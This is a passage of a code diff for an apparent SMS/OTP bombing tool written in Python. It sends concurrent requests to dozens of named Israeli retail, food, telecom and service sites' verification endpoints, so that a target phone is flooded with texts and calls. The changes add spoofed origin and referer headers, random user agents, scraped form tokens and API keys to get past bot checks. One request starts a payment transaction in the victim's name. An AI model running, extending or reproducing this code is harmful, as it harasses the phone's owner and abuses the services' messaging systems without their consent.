-                data={"action": "business_reg_action", "phone": phone_intl, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
-            send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
-                json_data={"phone": raw}, tag="shufersal"),
-            send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="ramilevy"),
-            send_request(s, "https://www.victory.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="victory"),
-            send_request(s, "https://www.10bis.co.il/api/register",
-                json_data={"phone": raw}, tag="10bis"),
-            send_request(s, "https://www.mcdonalds.co.il/api/verify",
-                json_data={"phone": raw}, tag="mcdonalds"),
-            send_request(s, "https://www.burgerking.co.il/api/auth",
-                json_data={"phone": raw}, tag="burgerking"),
-            send_request(s, "https://www.kfc.co.il/api/sms",
-                json_data={"phone": raw}, tag="kfc"),
-            send_request(s, "https://www.pizza-hut.co.il/api/register",
-                json_data={"phone": raw}, tag="pizzahut"),
-            send_request(s, "https://www.dominos.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="dominos"),
-            send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}", tag="burgeranch"),
-            send_request(s, "https://api.pango.co.il/auth/otp",
-                json_data={"phoneNumber": raw}, tag="pango"),
-            send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
-                json_data={"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": raw, "phoneCall": False}, tag="hopon"),
-            send_request(s, "https://www.yad2.co.il/api/auth/register",
-                json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
-            send_request(s, "https://payboxapp.com/api/auth/otp",
-                json_data={"phone": raw}, tag="paybox"),
-            send_request(s, "https://www.super-pharm.co.il/api/sms",
-                json_data={"phone": raw}, tag="superpharm"),
-            send_request(s, "https://www.zap.co.il/api/auth/sms",
-                json_data={"phone": raw}, tag="zap"),
-            send_request(s, f"https://www.ivory.co.il/user/login/sendCodeSms/{random_email}/{raw}",
-                method="GET", tag="ivory"),
-            send_request(s, "https://www.wolt.com/api/v1/verify",
-                json_data={"phone": raw}, tag="wolt"),
-            send_request(s, "https://femina.co.il/apps/feminaapp/auth/send-code",
-                json_data={"phone": raw}, tag="femina"),
-            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
-                json_data={"phone": raw, "channel": "sms"}, tag="zygo"),
-            send_request(s, "https://proxy1.citycar.co.il/api/verify/login",
-                json_data={"phoneNumber": phone_intl, "verifyChannel": 0, "loginOrRegister": 2}, tag="citycar"),
-            send_request(s, "https://trusty.co.il/api/auth/ask-for-auth-code",
-                json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
-            send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp",
-                json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
-            send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb",
-                form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
-            send_request(s, "https://www.delta.co.il/customer/ajax/post/",
-                form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", tag="delta"),
-            send_request(s, "https://www.adikastyle.com/customer/ajax/post/",
-                form=f"form_key=xyz789&bot_validation=1&type=login&telephone={raw}", tag="adika"),
-            send_request(s, "https://www.weshoes.co.il/customer/ajax/post/",
-                form=f"form_key=def456&bot_validation=1&type=login&telephone={raw}", tag="weshoes"),
-            send_request(s, "https://www.fixunderwear.com/customer/ajax/post/",
-                form=f"form_key=ghi789&bot_validation=1&type=login&telephone={raw}", tag="fix"),
-            send_request(s, "https://www.kiwi-kids.co.il/customer/ajax/post/",
-                form=f"form_key=jkl012&bot_validation=1&type=login&telephone={raw}", tag="kiwi"),
-            send_request(s, "https://www.nautica.co.il/customer/ajax/post/",
-                form=f"form_key=mno345&bot_validation=1&type=login&telephone={raw}", tag="nautica"),
-            send_request(s, "https://www.yvesrocher.co.il/customer/ajax/post/",
-                form=f"form_key=pqr678&bot_validation=1&type=login&telephone={raw}", tag="yvesrocher"),
-            send_request(s, "https://www.victoriassecret.co.il/customer/ajax/post/",
-                form=f"form_key=stu901&bot_validation=1&type=login&telephone={raw}", tag="victoria"),
-            send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
-                form=f"form_key=XEWGYBBTMOFgpPkO&bot_validation=1&type=login&telephone={raw}", tag="golfco"),
-            send_request(s, "https://019sms.co.il/api/register",
-                json_data={"phone": raw}, tag="019"),
-            send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
-                data={"action": "elementor_pro_forms_send_form", "post_id": "351178", "form_id": "7079d8dd", "form_fields[name]": "CyberIL", "form_fields[phone]": raw, "form_fields[email]": random_email, "form_fields[accept]": "on"}, tag="care"),
-            send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungle"),
-            send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
-                form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
-            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
-                json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid}, tag="mishloha"),
-            send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
-                json_data={"msisdn": phone_intl}, tag="freetv"),
-            send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
-                json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
-            send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
-                json_data={"phone": f"972{raw[1:]}"}, tag="freeivr"),
-            send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
-                json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
+                json_data={"agreeTou": True, "phone": formatted},
+                headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
+                tag="netfree"),
+            claude_request(s, raw),
+            oshioshi_request(s, raw),
+            freetv_request(s, raw),
+            webcut_request(s, raw),
+            freeivr_request(s, raw),
+            mitmachim_request(s, raw),
+            pelephone_request(s, raw),
+            cellcom_request(s, raw),
+            partner_request(s, raw),
+            hot_request(s, raw),
+            bezeq_request(s, raw),
+            gett_request(s, formatted, random_email),
+            shufersal_request(s, raw),
+            ramilevy_request(s, raw),
+            victory_request(s, raw),
+            tenbis_request(s, raw),
+            mcdonalds_request(s, raw),
+            burgerking_request(s, raw),
+            kfc_request(s, raw),
+            pizzahut_request(s, raw),
+            dominos_request(s, raw),
+            burgeranch_request(s, raw),
+            pango_request(s, raw),
+            hopon_request(s, raw),
+            yad2_request(s, raw),
+            paybox_request(s, raw),
+            superpharm_request(s, raw),
+            zap_request(s, raw),
+            wolt_request(s, raw),
+            send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
+                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
+                tag="negev-group"),
+            send_request(s, "https://www.gali.co.il/customer/ajax/post/",
+                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
+                tag="gali"),
+            send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/",
+                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
+                tag="aldoshoes"),
+            send_request(s, "https://www.hoodies.co.il/customer/ajax/post/",
+                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
+                tag="hoodies"),
             send_request(s, "https://api.gomobile.co.il/api/login",
-                json_data={"phone": raw}, tag="gomobile"),
+                json_data={"phone": raw},
+                headers_extra=json_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
+                tag="gomobile"),
             send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
-                json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonita"),
+                json_data={"action":"login","otpBy":"sms","otpValue":raw},
+                headers_extra=json_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
+                tag="bonitademas"),
+            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
+                json_data={"phone":raw},
+                headers_extra=json_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
+                tag="storyonline"),
             send_request(s, "https://www.crazyline.com/customer/ajax/post/",
-                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}", tag="crazy"),
+                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
+                tag="crazyline"),
+            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
+                json_data={"phone_number": raw, "operation": "request_number_verification"},
+                headers_extra=json_headers("https://wolt.com", "https://wolt.com/"),
+                tag="wolt-captcha"),
+            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
+                json_data={"phoneNumber": raw, "isCalling": True},
+                headers_extra=json_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
+                tag="mishloha"),
+            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
+                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
+                tag="golfkids"),
+            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
+                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
+                tag="onot"),
             send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": "498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
+                json_data={"phoneNumber":raw,"uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"},
+                headers_extra=json_headers("https://fox.co.il", "https://fox.co.il/"),
+                tag="fox"),
             send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": "6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
+                json_data={"phoneNumber":raw,"uuid":"6db5a63b-6882-414f-a090-de263dd917d7"},
+                headers_extra=json_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
+                tag="foxhome"),
             send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
+                json_data={"phoneNumber":raw,"uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"},
+                headers_extra=json_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
+                tag="laline"),
             send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
-                json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
+                json_data={"phoneNumber":raw,"uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"},
+                headers_extra=json_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
+                tag="footlocker"),
+            send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
+                form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
+                tag="golfco"),
+            send_request(s, "https://www.timberland.co.il/customer/ajax/post/",
+                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}",
+                headers_extra=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
+                tag="timberland"),
+            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
+                form=f"value={raw}&type=phone&projectId=1",
+                headers_extra=form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
+                tag="solopizza"),
             send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
-                json_data={"value": raw, "type": "phone", "projectId": "1"}, tag="hamal"),
+                json_data={"value":raw,"type":"phone","projectId":"1"},
+                headers_extra=json_headers("https://hamal.co.il", "https://hamal.co.il/"),
+                tag="hamal"),
+            send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/",
+                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
+                tag="urbanica"),
             send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
-                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="intima"),
+                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
+                tag="intima"),
             send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
-                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="steimatzky"),
+                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
+                tag="steimatzky"),
             send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
-                form=f"value={raw}&value_type=", tag="globes"),
+                form=f"value={raw}&value_type=",
+                headers_extra=form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
+                tag="globes"),
             send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
-                form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
-            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
-                form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
-            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
-                data=geteat_fd, tag="geteat"),
-            send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code",
-                json_data={"phone": raw}, tag="histadrut"),
-            send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}", tag="papajohns"),
-            send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}", tag="iburgerim"),
-            send_request(s, f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
-                method="GET", tag="americanlaser"),
-            send_request(s, "https://xtra.co.il/apps/api/inforu/sms",
-                json_data={"phoneNumber": raw}, tag="xtra"),
-            send_request(s, "https://server.myofer.co.il/api/sendAuthSms",
-                json_data={"phoneNumber": raw}, tag="myofer"),
-            send_request(s, "https://api.noyhasade.co.il/api/login?origin=web",
-                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
-            send_request(s, "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
-                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
-            send_request(s, "https://rest-api.dibs-app.com/otps",
-                json_data={"phoneNumber": phone_intl}, tag="dibs"),
-        ]
-        
-        all_tasks.extend(tasks)
-        
-        all_res = await asyncio.gather(*all_tasks, return_exceptions=True)
+                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false",
+                headers_extra=form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
+                tag="moraz"),
+            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
+                json_data={"phoneNumber": raw, "uuid": sid},
+                headers_extra=json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
+                tag="itaybrands"),
+            send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
+                form=f"action=validate_user_by_sms&phone={raw}",
+                headers_extra=form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
+                tag="spicesonline"),
+            send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
+                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
+                tag="stepin"),
+            send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
+                form=f"phone={raw}&template=OTP&type=1",
+                headers_extra={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_agent()},
+                tag="ramilevy-mobile"),
+            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
+                json_data={"phone": raw},
+                headers_extra={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
+                tag="zygo"),
+            send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
+                json_data={"mobile": raw},
+                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
+                tag="tabit"),
+            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}",
+                headers_extra={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
+                tag="ivr"),
+            send_request(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
+                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"},
+                headers_extra={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
+                tag="call2all"),
+            send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
+                json_data={"phoneNumber": formatted},
+                headers_extra=json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
+                tag="dibs"),
+            send_request(s, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
+                tag="ninewest"),
+            send_request(s, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
+                tag="leecooper"),
+            send_request(s, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
+                tag="kiko"),
+            send_request(s, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
+                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
+                tag="topten"),
+            send_request(s, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}",
+                headers_extra={**form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
+                tag="lehamim"),
+            send_request(s, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
+                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None},
+                headers_extra=json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
+                tag="555"),
+            send_request(s, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
+                form=f"action=simply-check-member-cellphone&cellphone={raw}",
+                headers_extra=form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
+                tag="jungleclub"),
+            send_request(s, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
+                form=f"action=simply-check-member-cellphone&cellphone={raw}",
+                headers_extra=form_headers("https://blendo.co.il", "https://blendo.co.il/"),
+                tag="blendo"),
+            send_request(s, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
+                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True},
+                headers_extra=json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
+                tag="mishloha2"),
+            send_request(s, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
+                data=f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/",
+                headers_extra=form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
+                tag="wecare"),
+            send_request(s, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
+                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1",
+                headers_extra={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
+                tag="matara"),
+            send_request(s, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
+                form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true",
+                headers_extra=form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/"),
+                tag="wissotzky"),
+            send_request(s, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
+                json_data={"phone": raw},
+                headers_extra=json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
+                tag="ok2go"),
+            send_request(s, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
+                json_data={"phone": raw},
+                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
+                tag="histadrut"),
+            send_request(s, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}",
+                headers_extra={**form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
+                tag="papajohns"),
+            send_request(s, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
+                form=f"phone={raw}",
+                headers_extra={**form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
+                tag="iburgerim"),
+            send_request(s, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
+                headers_extra={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
+                tag="americanlaser"),
+            send_request(s, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw}",
+                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw},
+                headers_extra=json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
+                tag="beecomm"),
+            send_request(s, "POST", "https://xtra.co.il/apps/api/inforu/sms",
+                json_data={"phoneNumber": raw},
+                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
+                tag="xtra"),
+            send_request(s, "POST", "https://www.lighting.co.il/customer/ajax/post/",
+                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
+                tag="lighting"),
+            send_request(s, "POST", "https://proxy1.citycar.co.il/api/verify/login",
+                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1},
+                headers_extra=json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
+                tag="citycar"),
+            send_request(s, "POST", "https://www.lilit.co.il/customer/ajax/post/",
+                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
+                tag="lilit"),
+            send_request(s, "POST", "https://www.castro.com/customer/ajax/post/",
+                form=f"bot_validation=1&type=login&telephone={raw}",
+                headers_extra=form_headers("https://www.castro.com", "https://www.castro.com/"),
+                tag="castro"),
+            send_request(s, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
+                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
+                tag="bathandbody"),
+            send_request(s, "POST", "https://www.golbary.co.il/customer/ajax/post/",
+                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
+                headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
+                tag="golbary"),
+            send_request(s, "POST", "https://api.getpackage.com/v1/graphql/",
+                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
+                headers_extra=json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
+                tag="getpackage"),
+            send_request(s, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
+                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b",
+                headers_extra={**form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
+                tag="ohmama"),
+            send_request(s, "POST", "https://server.myofer.co.il/api/sendAuthSms",
+                json_data={"phoneNumber": raw},
+                headers_extra=json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
+                tag="myofer"),
+            send_request(s, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
+                form=f"action=user_login_step_1&phone_number={raw}&step[]=1",
+                headers_extra=form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
+                tag="arcaffe"),
+            send_request(s, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
+                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"},
+                headers_extra=json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
+                tag="noyhasade"),
+            send_request(s, "POST", "https://api.geteat.co.il/auth/sendValidationCode",
+                data=geteat_fd,
+                headers_extra={"User-Agent": random_agent(), "accept-encoding": "gzip, deflate", "origin": "https://order.geteat.co.il", "referer": "https://order.geteat.co.il/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site"},
+                tag="geteat"),
+        ] + atmos_club
+
+        all_res = await asyncio.gather(*tasks, return_exceptions=True)
         success = 0
+        failed = []
         
         for r in all_res:
             if isinstance(r, Exception):
                 continue
             elif isinstance(r, tuple):
-                ok, name = r
-                if ok:
-                    success += 1
-        
-        return success
+                if len(r) == 3:
+                    ok, name, reason = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(f"{name} ({reason})")
+                else:
+                    ok, name = r
+                    if ok:
+                        success += 1
+                    else:
+                        failed.append(name)
+
+        for r in atmos_sms:
